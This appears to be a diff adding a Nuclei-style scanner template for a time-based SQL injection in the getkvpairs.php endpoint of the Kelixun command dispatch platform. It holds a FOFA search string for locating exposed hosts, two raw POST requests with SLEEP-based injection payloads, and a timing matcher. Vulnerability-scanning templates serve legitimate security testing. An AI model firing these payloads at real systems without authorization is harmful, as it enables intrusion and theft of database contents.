@@ -1,0 +1,41 @@
+id: KeLiXunTongXin-ZhiHuiDiaoDuPingTai-getkvpairs_php-SQL-Time
+
+info:
+  name: 科立讯通信 指挥调度平台 getkvpairs.php SQL延时注入
+  author: HuanXiong
+  severity: high
+  description: |
+    fofa: body="指挥调度管理平台"
+    科立讯通信指挥调度平台存在SQL延时注入漏洞，攻击者可通过构造恶意HTTP请求，利用漏洞接口/路径触发漏洞，
+    注入延时SQL语句，触发页面延时响应，进而获取数据库敏感信息，危害系统安全。
+  reference:
+    - 
+  tags: sql-time, kelixuntongxin, zhihuidiaodupingtai
+
+http:
+  - raw:
+      - |-
+        POST /custom/zx/getkvpairs.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
+        Accept: */*
+        Connection: keep-alive
+        Content-Type: application/x-www-form-urlencoded
+
+        number=1%27%20AND%20(SELECT%207545%20FROM%20(SELECT(SLEEP(4)))Zjzw)%20AND%20%27czva%27=%27czva&key=1
+
+      - |-
+        POST /custom/zx/getkvpairs.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
+        Accept: */*
+        Connection: keep-alive
+        Content-Type: application/x-www-form-urlencoded
+
+        number=1%27%20AND%20(SELECT%207545%20FROM%20(SELECT(SLEEP(8)))Zjzw)%20AND%20%27czva%27=%27czva&key=1
+
+    matchers:
+      - type: dsl
+        name: SQL延时注入
+        dsl:
+          - "status_code==200 && duration_1>=4 && duration_1<=5 && duration_2>=8 && duration_2<=9"
